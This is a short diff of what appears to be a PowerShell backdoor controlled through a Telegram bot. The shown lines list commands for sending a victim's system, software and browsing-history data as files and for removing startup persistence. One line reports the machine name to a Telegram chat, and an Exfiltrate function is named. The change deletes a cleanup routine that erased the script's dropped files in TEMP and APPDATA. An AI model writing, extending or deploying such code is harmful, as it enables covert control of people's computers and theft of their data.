@@ -90,7 +90,6 @@ Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
 RemovePersistance   : Remove Startup Persistance
-CleanUp    : Delete Files made the by script
 ==============================================
 ============ $glass Examples and Info $glass ===========
 ==============================================
@@ -118,12 +117,6 @@ $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 exit
-}
-
-Function Cleanup{
-rm -path "$env:TEMP\temp.ps1"
-rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1"
-rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs"
 }
 
 Function Exfiltrate {
